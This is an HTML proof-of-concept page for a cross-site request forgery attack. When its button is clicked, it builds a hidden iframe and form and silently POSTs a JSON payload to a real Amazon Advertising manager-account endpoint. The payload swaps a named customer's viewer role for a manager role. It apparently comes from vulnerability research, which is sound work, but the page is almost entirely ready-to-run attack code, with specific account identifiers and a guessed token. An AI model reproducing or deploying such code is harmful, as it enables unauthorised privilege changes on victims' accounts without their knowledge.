<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF PoC</h1>
    <p>Click the button below to trigger the CSRF attack.</p>
    <button onclick="sendCSRFRequest()">Execute CSRF</button>
    <script>
        function sendCSRFRequest() {
            // Create an invisible iframe
            var iframe = document.createElement("iframe");
            iframe.style.display = "none";
            document.body.appendChild(iframe);

            // Construct the form inside the iframe
            var form = iframe.contentWindow.document.createElement("form");
            form.method = "POST";
            form.action = "https://advertising.amazon.com/am/managerAccounts/api/v1/ma/amzn1.ads1.ma1.l6yqj9tdiab7y8d2s3x3bmqw/changeRoles";
            form.enctype = "application/json";

            // Create a hidden input to hold the JSON payload
            var input = iframe.contentWindow.document.createElement("input");
            input.type = "hidden";
            input.name = "data";
            input.value = JSON.stringify({
                "customerId": "A2BAW8V4Z73JNW",
                "rolesToAssociate": ["MasterAccount_Manager"],
                "rolesToDisassociate": ["MasterAccount_Viewer"]
            });

            // Add the hidden input to the form
            form.appendChild(input);

            // Add additional CSRF-related headers as hidden inputs
            var csrfToken = iframe.contentWindow.document.createElement("input");
            csrfToken.type = "hidden";
            csrfToken.name = "X-Csrf-Token";
            csrfToken.value = "1"; // Assuming this is the required token

            form.appendChild(csrfToken);

            // Append form to iframe document and submit
            iframe.contentWindow.document.body.appendChild(form);
            form.submit();
        }
    </script>
</body>
</html>
